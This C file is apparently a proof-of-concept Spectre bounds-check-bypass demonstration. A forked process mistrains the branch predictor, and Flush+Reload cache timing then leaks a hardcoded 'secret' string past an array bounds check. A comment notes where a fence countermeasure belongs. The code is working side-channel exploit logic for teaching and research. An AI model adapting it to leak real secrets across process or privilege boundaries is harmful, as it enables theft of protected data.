#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../../../libcache/cacheutils.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();
  flush(&len);
  flush(&x);
  
  // ensure data is flushed at this point
  mfence();

  // check that only accessible part (DATA) can be accessed
  if((float)x / (float)len < 1) {
    // countermeasure: add the fence here
    cache_encode(data[x]);
  }
}

int main(int argc, const char **argv) {
  // Detect cache threshold
  if(!CACHE_MISS) 
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  pagesize = sysconf(_SC_PAGESIZE);
  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);

  pid_t pid = fork();
  // initialize memory
  memset(mem, pid, pagesize * 256);

  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  char leaked[sizeof(DATA_SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(DATA_SECRET)] = 0;

  int j = 0;
  while(1) {
    // for every byte in the string
    j = (j + 1) % sizeof(DATA_SECRET);

    // mistrain with valid index
	if(pid == 0) {
	    for(int y = 0; y < 10; y++) {
	      access_array(0);
	    }
	}
	else {
		// potential out-of-bounds access
		access_array(j);

		// only show inaccessible values (SECRET)
		if(j >= sizeof(DATA) - 1) {
		  mfence(); // avoid speculation
		  cache_decode_pretty(leaked, j);
    }

		if(!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
      break;

		sched_yield();
		}
	}
	printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
}
